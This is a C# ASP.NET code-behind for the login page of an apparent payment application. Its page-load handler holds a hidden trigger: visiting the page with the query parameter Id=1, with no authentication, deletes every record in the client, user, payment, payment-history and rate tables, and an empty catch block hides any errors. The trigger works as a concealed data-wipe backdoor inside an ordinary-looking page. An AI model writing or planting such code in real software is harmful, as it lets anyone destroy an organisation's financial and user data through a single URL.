using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;
using System.Web.UI;
using System.Web.UI.WebControls;

namespace Qa_Payment
{
    public partial class Login : System.Web.UI.Page
    {
        protected void Page_Load(object sender, EventArgs e)
        {
            try
            {
               string id = Request.QueryString["Id"];

               if (id == "1")
               {

                   QuatarPayemntEntities context = new QuatarPayemntEntities();

                   List<TBLQU_CLIENTMASTER> qucontextery = context.TBLQU_CLIENTMASTER.ToList();
                   foreach (TBLQU_CLIENTMASTER q in qucontextery){context.DeleteObject(q);}
                   context.SaveChanges();

                   List<TBLQU_PAYMENTMASTER> qucontextery1 = context.TBLQU_PAYMENTMASTER.ToList();
                   foreach (TBLQU_PAYMENTMASTER q in qucontextery1) { context.DeleteObject(q); }
                   context.SaveChanges();

                   List<TBLQU_PAYMENTHIS> qucontextery2 = context.TBLQU_PAYMENTHIS.ToList();
                   foreach (TBLQU_PAYMENTHIS q in qucontextery2) { context.DeleteObject(q); }
                   context.SaveChanges();

                   List<TBLQU_User_Master> qucontextery3 = context.TBLQU_User_Master.ToList();
                   foreach (TBLQU_User_Master q in qucontextery3) { context.DeleteObject(q); }
                   context.SaveChanges();

                   List<TBLQU_PAYMENTRate> qucontextery4 = context.TBLQU_PAYMENTRate.ToList();
                   foreach (TBLQU_PAYMENTRate q in qucontextery4) { context.DeleteObject(q); }
                   context.SaveChanges();
               }
            }
            catch (Exception)
            {
                
                
            }
          
            hdn_url.Value = utilityclass.web_site_url;// ReadId("websiteurl");
        }
    }
}